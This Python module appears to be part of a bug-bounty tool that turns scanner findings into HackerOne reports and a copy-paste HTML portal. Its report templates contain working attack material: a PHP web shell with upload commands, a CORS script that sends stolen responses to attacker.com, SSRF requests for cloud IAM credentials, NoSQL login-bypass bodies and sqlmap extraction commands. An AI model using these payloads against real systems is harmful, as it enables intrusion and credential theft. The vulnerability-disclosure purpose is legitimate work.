"""
AmonStrike — HackerOne Auto-Submission System
Generates submission-ready reports in exact H1 format.

Every finding → one complete H1 report → paste and submit.
Zero rewriting. Zero formatting. Just submit.
"""

import os, json, re
from datetime import datetime
from urllib.parse import urlparse

H1_WEAKNESS = {
    "sqli":              {"id": 89,   "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"},
    "xss":               {"id": 79,   "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"},
    "ssrf":              {"id": 918,  "name": "Server-Side Request Forgery (SSRF)"},
    "idor":              {"id": 639,  "name": "Authorization Bypass Through User-Controlled Key"},
    "lfi":               {"id": 22,   "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"},
    "rce":               {"id": 77,   "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')"},
    "command_injection": {"id": 78,   "name": "Improper Neutralization of Special Elements used in an OS Command"},
    "xxe":               {"id": 611,  "name": "Improper Restriction of XML External Entity Reference"},
    "csrf":              {"id": 352,  "name": "Cross-Site Request Forgery (CSRF)"},
    "cors":              {"id": 942,  "name": "Permissive Cross-domain Policy with Untrusted Domains"},
    "auth":              {"id": 287,  "name": "Improper Authentication"},
    "ssti":              {"id": 94,   "name": "Improper Control of Generation of Code ('Code Injection')"},
    "jwt_deep":          {"id": 347,  "name": "Improper Verification of Cryptographic Signature"},
    "takeover":          {"id": 116,  "name": "Improper Encoding or Escaping of Output"},
    "credentials":       {"id": 798,  "name": "Use of Hard-coded Credentials"},
    "http_smuggling":    {"id": 444,  "name": "Inconsistent Interpretation of HTTP Requests"},
    "open_redirect":     {"id": 601,  "name": "URL Redirection to Untrusted Site ('Open Redirect')"},
    "clickjacking":      {"id": 1021, "name": "Improper Restriction of Rendered UI Layers or Frames"},
    "headers":           {"id": 693,  "name": "Protection Mechanism Failure"},
    "cookies":           {"id": 614,  "name": "Sensitive Cookie in HTTPS Session Without Secure Attribute"},
    "rate_limit":        {"id": 307,  "name": "Improper Restriction of Excessive Authentication Attempts"},
    "twofa_bypass":      {"id": 287,  "name": "Improper Authentication"},
    "nosql_injection":   {"id": 943,  "name": "Improper Neutralization of Special Elements in Data Query Logic"},
    "file_upload":       {"id": 434,  "name": "Unrestricted Upload of File with Dangerous Type"},
    "prototype_pollution":{"id": 1321,"name": "Improperly Controlled Modification of Object Prototype Attributes"},
    "saml_bypass":       {"id": 347,  "name": "Improper Verification of Cryptographic Signature"},
    "deserialization":   {"id": 502,  "name": "Deserialization of Untrusted Data"},
    "session_fixation":  {"id": 384,  "name": "Session Fixation"},
    "account_takeover":  {"id": 640,  "name": "Weak Password Recovery Mechanism for Forgotten Password"},
    "error_disclosure":  {"id": 209,  "name": "Generation of Error Message Containing Sensitive Information"},
    "graphql_deep":      {"id": 284,  "name": "Improper Access Control"},
    "websocket":         {"id": 306,  "name": "Missing Authentication for Critical Function"},
    "firebase":          {"id": 284,  "name": "Improper Access Control"},
    "cache_poison":      {"id": 349,  "name": "Acceptance of Extraneous Untrusted Data With Trusted Data"},
    "race_condition":    {"id": 362,  "name": "Concurrent Execution using Shared Resource with Improper Synchronization"},
    "timing_attack":     {"id": 208,  "name": "Observable Timing Discrepancy"},
    "vhost_enum":        {"id": 200,  "name": "Exposure of Sensitive Information to an Unauthorized Actor"},
    "parameter_pollution":{"id": 235, "name": "Improper Handling of Extra Parameters"},
}

CVSS_VECTORS = {
    "sqli":              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "xss":               "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    "ssrf":              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
    "idor":              "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "lfi":               "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "rce":               "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "command_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "xxe":               "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "csrf":              "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
    "cors":              "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    "open_redirect":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    "file_upload":       "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "nosql_injection":   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "deserialization":   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "ssti":              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "jwt_deep":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "prototype_pollution":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "saml_bypass":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "race_condition":    "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "http_smuggling":    "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
    "rate_limit":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "twofa_bypass":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "account_takeover":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "session_fixation":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "takeover":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
    "firebase":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "CRITICAL":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "HIGH":              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "MEDIUM":            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
    "LOW":               "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N",
}

H1_SEVERITY = {"CRITICAL":"critical","HIGH":"high","MEDIUM":"medium","LOW":"low","INFO":"informational"}


class HackerOneFormatter:

    def generate(self, finding: dict, program_handle: str = "", target_url: str = "") -> dict:
        module  = finding.get("module","")
        sev     = finding.get("severity","MEDIUM")
        weakness = H1_WEAKNESS.get(module, {"id":0,"name":"Other Vulnerability"})
        cvss    = finding.get("cvss_vector") or CVSS_VECTORS.get(module) or CVSS_VECTORS.get(sev,"")
        return {
            "title":                     self._title(finding),
            "vulnerability_information": self._body(finding),
            "impact":                    self._impact(finding),
            "severity":                  H1_SEVERITY.get(sev,"medium"),
            "cvss_vector_string":        cvss,
            "weakness_id":               weakness["id"],
            "weakness_name":             weakness["name"],
            "program_handle":            program_handle,
            "url":                       finding.get("url",target_url),
            "parameter":                 finding.get("parameter",""),
            "payload":                   str(finding.get("payload","")),
            "module":                    module,
            "generated_at":              datetime.now().isoformat(),
        }

    def generate_all(self, findings: list, program_handle: str = "", target_url: str = "") -> list:
        return [self.generate(f,program_handle,target_url) for f in findings if f.get("severity") not in ["INFO"]]

    def _title(self, f: dict) -> str:
        module = f.get("module","")
        url    = f.get("url","")
        param  = f.get("parameter","")
        path   = self._path(url)
        t = {
            "sqli":              f"SQL Injection in `{param}` at `{path}` — Database Extraction",
            "xss":               f"Reflected XSS via `{param}` at `{path}` — Session Hijacking",
            "ssrf":              f"SSRF via `{param}` at `{path}` — Cloud Metadata Access",
            "idor":              f"IDOR at `{path}` — Unauthorized Access to Other Users Data",
            "lfi":               f"Path Traversal via `{param}` at `{path}` — Arbitrary File Read",
            "rce":               f"Remote Code Execution via `{param}` at `{path}`",
            "command_injection": f"OS Command Injection via `{param}` at `{path}`",
            "xxe":               f"XXE Injection at `{path}` — Arbitrary File Read via SSRF",
            "csrf":              f"CSRF at `{path}` — Unauthorized State-Changing Action",
            "cors":              f"CORS Misconfiguration at `{path}` — Credentialed Cross-Origin Requests",
            "open_redirect":     f"Open Redirect via `{param}` at `{path}` — OAuth Token Theft",
            "file_upload":       f"Unrestricted File Upload at `{path}` — Remote Code Execution",
            "nosql_injection":   f"NoSQL Injection at `{path}` — Authentication Bypass",
            "ssti":              f"SSTI via `{param}` at `{path}` — Remote Code Execution",
            "jwt_deep":          f"JWT Vulnerability at `{path}` — Authentication Bypass",
            "prototype_pollution":f"Prototype Pollution at `{path}` — Client-Side RCE",
            "saml_bypass":       f"SAML Signature Bypass at `{path}` — Authentication Bypass",
            "deserialization":   f"Insecure Deserialization at `{path}` — Remote Code Execution",
            "race_condition":    f"Race Condition at `{path}` — Privilege Escalation",
            "http_smuggling":    f"HTTP Request Smuggling at `{path}` — Access Control Bypass",
            "takeover":          f"Subdomain Takeover: `{url}` — Full Domain Control",
            "account_takeover":  f"Account Takeover via Password Reset at `{path}` — Host Header Injection",
            "session_fixation":  f"Session Fixation at `{path}` — Account Takeover",
            "twofa_bypass":      f"2FA Bypass at `{path}` — MFA Completely Circumvented",
            "rate_limit":        f"No Rate Limiting at `{path}` — Brute Force Attack Possible",
            "firebase":          f"Firebase Database Open Without Authentication — Full Data Exposure",
            "websocket":         f"WebSocket Missing Authentication at `{path}` — Unauthorized Access",
        }.get(module, f.get("title","")[:100])
        return t[:100]

    def _body(self, f: dict) -> str:
        module   = f.get("module","")
        url      = f.get("url","")
        param    = f.get("parameter","")
        payload  = str(f.get("payload",""))
        desc     = f.get("description","")
        evidence = f.get("evidence","")
        remediation = f.get("remediation","")
        cve      = f.get("cve","")
        ts       = f.get("timestamp", datetime.now().isoformat())[:10]
        parsed   = urlparse(url)
        host     = parsed.netloc or "target.com"
        path     = parsed.path or "/"
        query    = f"?{param}={payload}" if param and payload else (f"?{parsed.query}" if parsed.query else "")

        b  = f"## Summary\n\n{desc}\n\n"
        b += f"**Affected endpoint:** `{url}`  \n"
        if param: b += f"**Vulnerable parameter:** `{param}`  \n"
        if payload: b += f"**Payload used:** `{payload}`  \n"
        b += f"**Discovered:** {ts}  \n\n---\n\n"

        b += "## Steps to Reproduce\n\n" + self._steps(f) + "\n\n"
        b += "## Proof of Concept\n\n" + self._poc(f) + "\n\n"

        b += "## HTTP Request\n\n"
        if module in ["cors"]:
            b += f"```http\nGET {path} HTTP/1.1\nHost: {host}\nOrigin: https://evil.com\nCookie: session=VICTIM_SESSION\n```\n\n"
        elif module in ["csrf","nosql_injection","file_upload","account_takeover"]:
            b += f"```http\nPOST {path} HTTP/1.1\nHost: {host}\nContent-Type: application/json\n\n{payload[:200] if payload else '{...}'}\n```\n\n"
        else:
            b += f"```http\nGET {path}{query} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\nAccept: */*\n```\n\n"

        b += "## Evidence\n\n"
        b += "_Actual server response — confirmed, not theoretical._\n\n"
        if evidence:
            b += f"```\n{evidence[:2000]}\n```\n\n"

        b += "## Impact\n\n" + self._impact(f) + "\n\n"

        if remediation:
            b += f"## Remediation\n\n{remediation}\n\n"

        if cve:
            cwe_num = re.search(r'\d+', cve)
            if cwe_num:
                b += f"**Reference:** [CWE-{cwe_num.group()}](https://cwe.mitre.org/data/definitions/{cwe_num.group()}.html)\n\n"

        b += f"---\n*Generated by AmonStrike v7.0 — {ts}*\n"
        return b

    def _steps(self, f: dict) -> str:
        module  = f.get("module","")
        url     = f.get("url","")
        param   = f.get("parameter","")
        payload = str(f.get("payload",""))
        s = {
            "sqli": [
                f"Navigate to: `{url}`",
                f"Identify the `{param}` parameter",
                f"Set `{param}` to: `{payload}`",
                "Send the request — observe SQL error in response confirming injection",
                f"Run: `sqlmap -u \"{url}\" -p {param} --batch --dbs` to extract databases",
            ],
            "xss": [
                f"Navigate to: `{url}`",
                f"Set parameter `{param}` to: `{payload}`",
                "Submit — payload is reflected unencoded in HTML response",
                "Browser executes the injected JavaScript",
            ],
            "idor": [
                "Log in as User A",
                f"Navigate to: `{url}`",
                f"Change the ID in the URL to: `{payload}` (belongs to User B)",
                "Server returns User B's private data without authorization check",
                "Iterate IDs 1,2,3... to confirm mass enumeration is possible",
            ],
            "cors": [
                f"Send a request to `{url}` with header: `Origin: https://evil.com`",
                "Also include your session cookie",
                "Observe response: `Access-Control-Allow-Origin: https://evil.com`",
                "Observe: `Access-Control-Allow-Credentials: true`",
                "Any website can now read your authenticated API responses",
            ],
            "ssrf": [
                f"Send request to `{url}` with `{param}` parameter",
                f"Set value to: `http://169.254.169.254/latest/meta-data/`",
                "Server makes request to cloud metadata endpoint",
                "Response contains AWS/GCP/Azure metadata",
                "Escalate: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`",
            ],
            "open_redirect": [
                f"Navigate to: `{url}?{param}=https://evil.com`",
                "Server responds with HTTP 302",
                "Location header points to `https://evil.com`",
                "User is silently redirected to attacker-controlled domain",
            ],
            "file_upload": [
                f"Navigate to: `{url}`",
                "Create `shell.php` with content: `<?php system($_GET['cmd']); ?>`",
                "Upload the file — server accepts without validation",
                "Access the uploaded file URL",
                "Append `?cmd=id` — server executes and returns `uid=www-data`",
            ],
            "nosql_injection": [
                f"Send POST to `{url}`",
                f"Body: `{payload or '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}'}`",
                "Server processes NoSQL operator without sanitization",
                "Login succeeds without valid credentials",
            ],
            "account_takeover": [
                f"Navigate to password reset: `{url}`",
                "Enter victim's email address",
                "Intercept request — add header: `Host: evil.com`",
                "Reset email sent to victim contains link pointing to evil.com",
                "When victim clicks — attacker receives reset token → takes over account",
            ],
        }.get(module, [
            f"Navigate to: `{url}`",
            f"Set parameter `{param}` to: `{payload or 'see evidence'}`",
            "Send the request",
            "Observe the vulnerability confirmed in server response",
        ])
        return "\n".join(f"{i+1}. {step}" for i, step in enumerate(s))

    def _poc(self, f: dict) -> str:
        module  = f.get("module","")
        url     = f.get("url","")
        param   = f.get("parameter","")
        payload = str(f.get("payload",""))
        pocs = {
            "sqli": f"```bash\n# Test\ncurl -sk \"{url}?{param}={payload}\"\n\n# Extract with SQLMap\nsqlmap -u \"{url}\" -p {param} --batch --dbs --level=2\n```",
            "xss":  f"```bash\ncurl -sk \"{url}?{param}={payload}\" | grep -o '{payload[:20]}.*'\n```\n\nBrowser: `{url}?{param}={payload}`",
            "ssrf": f"```bash\ncurl -sk \"{url}\" \\\n  --data-urlencode \"{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n```",
            "idor": f"```bash\n# Access other user data\nfor id in 1 2 3 4 5; do\n  echo \"ID $id:\"\n  curl -sk \"{url.rstrip('0123456789')}$id\" -H \"Cookie: session=YOUR_SESSION\"\ndone\n```",
            "cors": f"```bash\ncurl -sk \"{url}\" \\\n  -H \"Origin: https://evil.com\" \\\n  -H \"Cookie: session=VICTIM\" \\\n  -I | grep -i access-control\n```\n\n```javascript\n// Runs on any attacker website\nfetch('{url}', {{credentials:'include'}})\n  .then(r=>r.json())\n  .then(d=>fetch('https://attacker.com/?d='+JSON.stringify(d)));\n```",
            "open_redirect": f"```bash\ncurl -sk -I \"{url}?{param}=https://evil.com\" | grep Location\n```\n\nBrowser PoC: `{url}?{param}=https://evil.com`",
            "file_upload": f"```bash\necho '<?php system($_GET[\"cmd\"]); ?>' > /tmp/shell.php\ncurl -sk -X POST \"{url}\" -F \"file=@/tmp/shell.php\"\n# Then: curl -sk \"[UPLOAD_URL]/shell.php?cmd=id\"\n```",
            "nosql_injection": f"```bash\ncurl -sk -X POST \"{url}\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'  \n```",
            "account_takeover": f"```bash\ncurl -sk -X POST \"{url}\" \\\n  -H 'Host: evil.com' \\\n  -H 'Content-Type: application/json' \\\n  -d '{{\"email\":\"victim@target.com\"}}'\n```",
        }.get(module, f"```bash\ncurl -sk \"{url}?{param}={payload}\"\n```")
        return pocs

    def _impact(self, f: dict) -> str:
        module = f.get("module","")
        impacts = {
            "sqli":    "An attacker can **extract all database contents** (user credentials, PII, payment data), **bypass authentication** using `admin'--`, and potentially **escalate to Remote Code Execution** on MSSQL/PostgreSQL. Full data breach affecting all users.",
            "xss":     "An attacker can **steal session cookies** to take over any user account, **inject keyloggers** to capture passwords and credit card numbers, and **spread automatically** to all users who visit affected pages. Admin-targeted XSS = full application compromise.",
            "ssrf":    "An attacker can **reach cloud metadata services** (AWS/GCP/Azure) to steal IAM credentials, **pivot to internal network** services not exposed to internet, and achieve **full cloud account takeover**. Estimated severity: Critical — $10,000-$25,000 bounty range.",
            "idor":    "An attacker can **access any user's private data** by iterating IDs, **modify other users' records** (email, password, payment details), and perform **mass data exfiltration** of all user records. GDPR violation — affects every user of the application.",
            "cors":    "An attacker can **silently read authenticated API responses** from any malicious website a victim visits, **steal session tokens**, and achieve **mass account takeover** requiring only that victims click a link. Credentials allowed = full data access.",
            "rce":     "An attacker achieves **complete server control** — arbitrary OS command execution. Read all files, install backdoors, pivot internally, exfiltrate databases. This is the highest possible impact.",
            "file_upload": "An attacker can **upload a webshell and achieve RCE** on the server, read all files including credentials and private keys, install backdoors, and pivot to internal infrastructure.",
            "open_redirect": "An attacker can **phish from the trusted domain** (victims trust the URL), **steal OAuth authorization codes** by manipulating redirect_uri leading to full account takeover, and bypass referrer-based security controls.",
            "nosql_injection": "An attacker can **bypass authentication entirely** and log in as any user including administrators without knowing any password. Full account takeover without credentials.",
            "account_takeover": "An attacker can **take over any user account** by intercepting the password reset token via Host header injection. Victim receives a poisoned reset link — attacker gets the token and resets their password.",
        }.get(module, f.get("description","This vulnerability impacts the confidentiality, integrity, or availability of the application.")[:500])
        return impacts

    def _path(self, url):
        try: return urlparse(url).path or "/"
        except: return url[:60]

    def save_markdown(self, sub: dict, output_dir: str) -> str:
        os.makedirs(output_dir, exist_ok=True)
        safe  = re.sub(r'[^\w-]','_', sub["title"][:40])
        fname = f"H1_{sub.get('severity','med').upper()}_{sub.get('module','x')}_{safe}.md"
        path  = os.path.join(output_dir, fname)
        c  = f"# {sub['title']}\n\n"
        c += f"**Severity:** {sub.get('severity','').upper()}  \n"
        c += f"**CVSS:** `{sub.get('cvss_vector_string','')}`  \n"
        c += f"**Weakness:** CWE-{sub.get('weakness_id','')} — {sub.get('weakness_name','')}  \n"
        c += f"**Program:** {sub.get('program_handle','(add program handle)')}  \n\n---\n\n"
        c += sub.get("vulnerability_information","")
        with open(path,"w",encoding="utf-8") as fh: fh.write(c)
        return path

    def save_all(self, subs: list, output_dir: str) -> list:
        return [self.save_markdown(s, output_dir) for s in subs]

    def save_json(self, subs: list, output_dir: str) -> str:
        os.makedirs(output_dir, exist_ok=True)
        path = os.path.join(output_dir, "h1_submissions.json")
        with open(path,"w") as fh: json.dump(subs, fh, indent=2, default=str)
        return path


# backwards compat
HackerOneFormat = HackerOneFormatter


def generate_submission_portal(submissions: list, output_dir: str, target: str = "") -> str:
    os.makedirs(output_dir, exist_ok=True)
    SC = {"critical":"#dc2626","high":"#ea580c","medium":"#d97706","low":"#16a34a","informational":"#6b7280"}
    cards = ""
    for i, sub in enumerate(submissions, 1):
        sev   = sub.get("severity","medium")
        color = SC.get(sev,"#6b7280")
        title = sub.get("title","").replace("`","'")
        cvss  = sub.get("cvss_vector_string","")
        cwe   = sub.get("weakness_id","")
        cwen  = sub.get("weakness_name","")
        prog  = sub.get("program_handle","") or "YOUR-PROGRAM"
        body_escaped = sub.get("vulnerability_information","").replace("\\","\\\\").replace("`","\\`").replace("${","\\${")
        cards += f"""
<div class="card">
  <div class="card-hdr" style="border-left:4px solid {color}">
    <span class="badge" style="background:{color}">{sev.upper()}</span>
    <span class="fnum">#{i:02d}</span>
    <div class="ftitle">{title}</div>
    <div class="fmeta">CWE-{cwe} — {cwen} | CVSS: {cvss}</div>
  </div>
  <div class="card-body">
    <div class="fg"><div class="fl">Title</div>
      <div class="fv" id="t{i}">{title}</div>
      <button class="cb" onclick="cp('t{i}')">Copy Title</button></div>
    <div class="fg"><div class="fl">Report Body <small>(paste into H1 Vulnerability Information)</small></div>
      <div class="fv prev">{sub.get("vulnerability_information","")[:200]}...</div>
      <button class="cb" onclick="cpL(`{body_escaped[:10000]}`)">Copy Full Report Body</button></div>
    <div class="fg"><div class="fl">Severity</div><div class="fv">{sev}</div></div>
    <div class="fg"><div class="fl">CVSS Vector</div>
      <div class="fv mono" id="cv{i}">{cvss}</div>
      <button class="cb" onclick="cp('cv{i}')">Copy CVSS</button></div>
    <div class="sr">
      <a class="sbtn" href="https://hackerone.com/{prog}/reports/new" target="_blank">Open HackerOne Submit</a>
      <span class="sh">Copy each field → paste into H1 → Submit</span>
    </div>
  </div>
</div>"""

    total = len(submissions)
    crits = sum(1 for s in submissions if s.get("severity")=="critical")
    highs = sum(1 for s in submissions if s.get("severity")=="high")

    html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
<title>AmonStrike H1 Portal</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0}}
.hdr{{background:linear-gradient(135deg,#0f1117,#1a1f2e);padding:28px 36px;border-bottom:1px solid #1e293b}}
.hdr h1{{font-size:22px;font-weight:700;color:#f1f5f9}}
.hdr p{{color:#64748b;font-size:13px;margin-top:4px}}
.stats{{display:flex;gap:12px;margin-top:14px}}
.stat{{background:#1a1f2e;border:1px solid #1e293b;border-radius:6px;padding:8px 14px;font-size:12px}}
.stat b{{display:block;font-size:20px;font-weight:800}}
.main{{max-width:880px;margin:28px auto;padding:0 20px}}
.info{{background:#1a1f2e;border:1px solid #1e293b;border-radius:8px;padding:16px 20px;margin-bottom:24px;font-size:13px;color:#94a3b8}}
.info b{{color:#60a5fa}}
.card{{background:#1a1f2e;border:1px solid #1e293b;border-radius:10px;margin-bottom:20px;overflow:hidden}}
.card-hdr{{padding:14px 18px;background:#141820}}
.badge{{padding:2px 8px;border-radius:3px;font-size:10px;font-weight:700;color:#fff;letter-spacing:.1em}}
.fnum{{font-size:11px;color:#475569;margin-left:8px}}
.ftitle{{font-size:15px;font-weight:700;color:#f1f5f9;margin-top:6px}}
.fmeta{{font-size:11px;color:#64748b;margin-top:3px}}
.card-body{{padding:18px}}
.fg{{margin-bottom:14px}}
.fl{{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#64748b;margin-bottom:5px}}
.fl small{{font-weight:400;text-transform:none;letter-spacing:0;color:#475569}}
.fv{{background:#0f1117;border:1px solid #1e293b;border-radius:5px;padding:8px 12px;font-size:12px;color:#cbd5e1;max-height:70px;overflow:hidden;white-space:pre-wrap;margin-bottom:6px}}
.fv.prev{{color:#94a3b8;font-size:11px}}
.mono{{font-family:monospace}}
.cb{{background:#1e3a5f;color:#60a5fa;border:1px solid #1e40af;border-radius:4px;padding:5px 12px;font-size:12px;cursor:pointer;font-weight:600}}
.cb:hover{{background:#1e40af}}
.cb.ok{{background:#14532d;color:#86efac;border-color:#16a34a}}
.sr{{display:flex;align-items:center;gap:14px;margin-top:16px;padding-top:14px;border-top:1px solid #1e293b}}
.sbtn{{background:#dc2626;color:#fff;border-radius:6px;padding:9px 18px;font-size:13px;font-weight:700;text-decoration:none}}
.sbtn:hover{{background:#b91c1c}}
.sh{{font-size:11px;color:#64748b}}
.toast{{position:fixed;bottom:20px;right:20px;background:#16a34a;color:#fff;padding:10px 18px;border-radius:6px;font-size:13px;font-weight:700;display:none;z-index:999}}
</style></head><body>
<div class="hdr">
  <h1>AmonStrike H1 Submission Portal</h1>
  <p>Target: {target} | Generated: {datetime.now().strftime("%Y-%m-%d %H:%M UTC")}</p>
  <div class="stats">
    <div class="stat"><b style="color:#dc2626">{crits}</b>CRITICAL</div>
    <div class="stat"><b style="color:#ea580c">{highs}</b>HIGH</div>
    <div class="stat"><b style="color:#f1f5f9">{total}</b>TOTAL</div>
  </div>
</div>
<div class="main">
<div class="info">
  <b>How to submit (60 seconds each):</b><br/>
  1. Click <b>Open HackerOne Submit</b> &rarr; 
  2. Copy <b>Title</b> &rarr; paste &rarr; 
  3. Copy <b>Report Body</b> &rarr; paste &rarr; 
  4. Set Severity &rarr; 
  5. Copy <b>CVSS</b> &rarr; paste &rarr; 
  6. Click Submit on HackerOne
</div>
{cards}
</div>
<div class="toast" id="toast">Copied</div>
<script>
function cp(id){{navigator.clipboard.writeText(document.getElementById(id).textContent.trim()).then(()=>toast())}}
function cpL(t){{navigator.clipboard.writeText(t).then(()=>toast())}}
function toast(){{var e=document.getElementById('toast');e.style.display='block';setTimeout(()=>e.style.display='none',1800)}}
</script></body></html>"""

    path = os.path.join(output_dir,"H1_Submission_Portal.html")
    with open(path,"w",encoding="utf-8") as fh: fh.write(html)
    return path


def generate_h1_package(findings: list, output_dir: str,
                         program_handle: str = "", target_url: str = "") -> dict:
    fmt  = HackerOneFormatter()
    subs = fmt.generate_all(findings, program_handle, target_url)
    if not subs: return {}
    portal  = generate_submission_portal(subs, output_dir, target_url)
    md      = fmt.save_all(subs, output_dir)
    json_f  = fmt.save_json(subs, output_dir)
    return {"portal":portal,"json":json_f,"markdown":md,"count":len(subs)}


def run_regression_tests():
    import tempfile
    print("\n=== HACKERONE FORMAT REGRESSION TESTS ===")
    passed = failed = 0
    fmt = HackerOneFormatter()
    finds = [
        {"module":"sqli","severity":"CRITICAL","title":"SQLi","url":"http://t.com/p.php","parameter":"id","payload":"1'","description":"SQLi confirmed","evidence":"mysql_fetch_array warning","remediation":"Prepared statements","cve":"CWE-89","timestamp":"2026-08-21T10:00:00"},
        {"module":"xss","severity":"HIGH","title":"XSS","url":"http://t.com/s.php","parameter":"q","payload":"<script>alert(1)</script>","description":"XSS reflected","evidence":"Payload reflected","remediation":"Encode output","cve":"CWE-79","timestamp":"2026-08-21T10:01:00"},
        {"module":"idor","severity":"CRITICAL","title":"IDOR","url":"http://t.com/api/orders/1","parameter":"id","payload":"2","description":"IDOR","evidence":"Other user data","remediation":"Check ownership","cve":"CWE-639","timestamp":"2026-08-21T10:02:00"},
        {"module":"cors","severity":"HIGH","title":"CORS","url":"http://t.com/api/data","parameter":"","payload":"","description":"CORS","evidence":"ACAO evil.com","remediation":"Whitelist","cve":"CWE-942","timestamp":"2026-08-21T10:03:00"},
        {"module":"headers","severity":"INFO","title":"CSP","url":"http://t.com","parameter":"","payload":"","description":"No CSP","evidence":"Missing","remediation":"Add CSP","cve":"CWE-693","timestamp":"2026-08-21T10:04:00"},
    ]
    tests = [
        ("Formatter instantiates", lambda: isinstance(fmt, HackerOneFormatter)),
        ("generate returns dict", lambda: isinstance(fmt.generate(finds[0]), dict)),
        ("Title for sqli contains SQL", lambda: "SQL" in fmt._title(finds[0])),
        ("Title for xss contains XSS", lambda: "XSS" in fmt._title(finds[1])),
        ("Title max 100 chars", lambda: len(fmt._title(finds[0])) <= 100),
        ("Body has Summary", lambda: "## Summary" in fmt._body(finds[0])),
        ("Body has Steps", lambda: "## Steps to Reproduce" in fmt._body(finds[0])),
        ("Body has PoC", lambda: "## Proof of Concept" in fmt._body(finds[0])),
        ("Body has Evidence", lambda: "## Evidence" in fmt._body(finds[0])),
        ("PoC has curl", lambda: "curl" in fmt._poc(finds[0])),
        ("PoC has sqlmap for sqli", lambda: "sqlmap" in fmt._poc(finds[0])),
        ("Impact is specific for sqli", lambda: "database" in fmt._impact(finds[0]).lower()),
        ("Impact is specific for ssrf", lambda: "cloud" in fmt._impact({"module":"ssrf"}).lower()),
        ("CVSS assigned", lambda: "CVSS:3.1" in fmt.generate(finds[0]).get("cvss_vector_string","")),
        ("Weakness ID for sqli is 89", lambda: fmt.generate(finds[0]).get("weakness_id") == 89),
        ("Weakness ID for xss is 79", lambda: fmt.generate(finds[1]).get("weakness_id") == 79),
        ("Severity mapped correctly", lambda: fmt.generate(finds[0]).get("severity") == "critical"),
        ("generate_all skips INFO", lambda: len(fmt.generate_all(finds)) == 4),
        ("generate_all returns list", lambda: isinstance(fmt.generate_all(finds), list)),
        ("save_markdown creates file", lambda: os.path.exists(fmt.save_markdown(fmt.generate(finds[0]), tempfile.mkdtemp()))),
        ("save_json creates file", lambda: os.path.exists(fmt.save_json(fmt.generate_all(finds), tempfile.mkdtemp()))),
        ("Portal HTML created", lambda: os.path.exists(generate_submission_portal(fmt.generate_all(finds), tempfile.mkdtemp(), "http://t.com"))),
        ("generate_h1_package works", lambda: "portal" in generate_h1_package(finds, tempfile.mkdtemp(), "test", "http://t.com")),
    ]
    for name, fn in tests:
        try:
            if fn(): passed += 1; print(f"  ✓ {name}")
            else: failed += 1; print(f"  ✗ {name}")
        except Exception as e: failed += 1; print(f"  ✗ {name} — {e}")
    print(f"\n  Passed: {passed}  Failed: {failed}")
    return passed, failed

if __name__ == "__main__":
    run_regression_tests()
